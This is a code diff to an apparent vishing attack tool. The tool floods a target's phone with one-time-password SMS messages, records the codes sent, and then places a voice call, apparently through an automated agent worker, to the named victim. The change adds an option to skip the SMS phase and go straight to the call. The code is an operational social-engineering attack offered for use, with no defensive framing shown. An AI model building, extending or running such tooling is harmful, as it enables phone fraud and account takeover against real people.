@@ -22,7 +22,7 @@ def print_sms_progress(current: int, total: int, code: str):
     print_status(f"SMS {current}/{total} sent (code: {code})")
 
 
-async def run_attack(phone: str, name: str):
+async def run_attack(phone: str, name: str, skip_sms: bool = False):
     """Execute the full vishing attack flow."""
     config = load_config()
 
@@ -33,30 +33,42 @@ async def run_attack(phone: str, name: str):
     print_status(f"Phone: {phone}")
     print_status("=" * 50)
 
-    # Phase 1: SMS Bombardment
-    print_status("")
-    print_status("PHASE 1: SMS BOMBARDMENT")
-    print_status("-" * 30)
+    valid_codes = []
 
-    sms = SMSBombardment(config)
-    sms.send_otp_burst(
-        to_number=phone,
-        count=5,
-        on_send=print_sms_progress
-    )
+    if skip_sms:
+        print_status("")
+        print_status("PHASE 1: SMS BOMBARDMENT (SKIPPED)")
+        print_status("-" * 30)
+        print_status("Skipping SMS phase as requested")
+    else:
+        # Phase 1: SMS Bombardment
+        print_status("")
+        print_status("PHASE 1: SMS BOMBARDMENT")
+        print_status("-" * 30)
 
-    valid_codes = sms.get_valid_codes()
-    print_status(f"All OTP codes sent: {', '.join(valid_codes)}")
+        sms = SMSBombardment(config)
+        sms.send_otp_burst(
+            to_number=phone,
+            count=5,
+            on_send=print_sms_progress
+        )
 
-    # Brief pause before call
-    print_status("")
-    print_status("Waiting 10 seconds before initiating call...")
-    time.sleep(10)
+        valid_codes = sms.get_valid_codes()
+        print_status(f"All OTP codes sent: {', '.join(valid_codes)}")
+
+        # Brief pause before call
+        print_status("")
+        print_status("Waiting 10 seconds before initiating call...")
+        time.sleep(10)
 
     # Phase 2: Voice Call
     print_status("")
     print_status("PHASE 2: VOICE CALL")
     print_status("-" * 30)
+    print_status("")
+    print_status("NOTE: Agent worker must be running in another terminal:")
+    print_status("  uv run vishing-worker")
+    print_status("")
 
     session = CallSession(
         target_name=name,
@@ -164,6 +176,11 @@ def main():
         action="store_true",
         help="Only send SMS messages, don't make call"
     )
+    parser.add_argument(
+        "--skip-sms",
+        action="store_true",
+        help="Skip SMS bombardment, go straight to call"
+    )
 
     args = parser.parse_args()
 
@@ -181,7 +198,7 @@ def main():
             sms.send_otp_burst(args.phone, count=5, on_send=print_sms_progress)
             print_status("Done!")
         else:
-            asyncio.run(run_attack(args.phone, args.name))
+            asyncio.run(run_attack(args.phone, args.name, skip_sms=args.skip_sms))
     except KeyboardInterrupt:
         print_status("\nAborted by user")
         sys.exit(1)
